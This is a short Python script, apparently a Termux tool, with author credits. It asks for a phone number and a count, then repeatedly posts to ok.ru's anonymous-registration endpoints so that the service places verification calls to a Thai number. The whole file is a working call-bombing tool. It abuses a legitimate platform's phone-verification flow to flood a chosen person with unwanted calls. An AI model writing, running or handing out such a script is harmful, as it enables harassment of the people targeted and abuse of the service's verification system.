try:
    import requests
    from requests import Session
    import os
    import sys
    import stdiomask
    import getpass
    os.system ("clear")
    os.system ("figlet call")
except:
       os.system ("pkg install figlet")
       os.system ("pip install stdiomask")
       os.system ("pip install getpass")
print ("""
by : sayser developer ees
facebook : Галоп Копытокопыт and Король Девсайсер 
youtube : sayser
""")
gnam=stdiomask.getpass("namber -> ")
nam=int(input("nam -> "))
print (" ")
print ("[*] phone -",gnam,"nam",nam)
print (" ")
def call():
           send = Session()
           send.headers.update({"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38","Content-Type" : "application/x-www-form-urlencoded","Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})
           snd = send.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data=f"st.r.phone=+66{gnam[1:]}")
           sed = send.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data="st.r.fieldAcceptCallUIButton=Call")
try:
    for i in range(1,nam):
       call()
       print ("call - ",i)
except KeyboardInterrupt:
                         print ("exit (developer sayser)")
